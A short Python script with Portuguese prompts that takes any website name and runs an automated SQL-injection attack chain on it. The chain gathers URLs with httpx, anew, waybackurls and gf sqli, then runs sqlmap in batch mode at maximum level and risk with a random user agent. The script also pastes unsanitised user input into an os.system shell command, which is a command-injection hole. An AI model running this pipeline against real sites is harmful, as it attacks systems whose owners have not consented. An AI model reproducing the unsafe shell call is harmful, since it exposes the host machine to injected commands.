import os

pergunta = input('Digite o site em que deseja procurar falhas: ')

# Use uma chamada de sistema para executar os comandos desejados
comando = f"echo '{pergunta}' | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 5 --risk 3"

# Execute o comando usando os.system
onliner = os.system(comando)

print(onliner)
